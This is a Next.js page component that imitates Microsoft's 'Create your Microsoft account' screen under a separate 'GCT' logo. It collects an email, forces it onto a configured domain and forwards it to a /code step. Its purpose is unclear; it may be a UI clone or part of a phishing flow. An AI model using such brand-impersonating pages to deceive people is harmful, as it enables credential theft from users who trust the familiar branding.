"use client";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState } from "react";

export default function CreateAccountPage() {
  const [email, setEmail] = useState("");
  const router = useRouter();
  const DOMAIN = (process.env.NEXT_PUBLIC_EMAIL_DOMAIN || "gmail.com").toLowerCase();

  function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    let v = email.trim();
    if (!v) return;
    if (!v.includes("@")) {
      v = `${v}@${DOMAIN}`;
    } else {
      const [local, dom] = v.split("@");
      if (dom.toLowerCase() !== DOMAIN) v = `${local}@${DOMAIN}`;
    }
    router.push(`/code?login=${encodeURIComponent(v)}`);
  }

  return (
    <main className="night-wrap min-h-dvh grid place-items-center p-6">
      <section className="dark-card w-[520px] rounded-xl p-8 text-center">
        <header className="flex items-center justify-center gap-3 mb-6">
          <Image src="/gctlogo.png" alt="GCT" width={26} height={26} />
          <span className="text-neutral-300 text-[16px] leading-none">Microsoft</span>
        </header>

        <h1 className="text-white text-2xl font-semibold mb-2">Create your Microsoft account</h1>
        <p className="text-neutral-300 text-sm leading-6 mb-6">
          Enter your email address.
        </p>

        <form onSubmit={onSubmit} className="text-left">
          <label className="block mb-6">
            <span className="sr-only">Email</span>
            <input
              className="ms-input ms-input-dark"
              placeholder={`Email (\u0040${DOMAIN})`}
              type="email"
              autoFocus
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </label>
          <div className="flex justify-end">
            <button className="primary-btn-dark" type="submit" style={{ width: 120 }}>
              Next
            </button>
          </div>
        </form>

        <p className="text-neutral-300 text-sm mt-6">
          Already have an account?{" "}
          <a className="link-dark" href="/">Sign in</a>
        </p>
      </section>

      <footer className="night-footer text-[13px] text-neutral-300/80">
        <nav className="flex gap-6 justify-center">
          <a className="link-dark" href="#">Help and feedback</a>
          <a className="link-dark" href="#">Terms of use</a>
          <a className="link-dark" href="#">Privacy and cookies</a>
        </nav>
        <p className="text-neutral-300/70 mt-3">
          Use private browsing if this is not your device. <a className="link-dark" href="#">Learn more</a>
        </p>
      </footer>
    </main>
  );
}
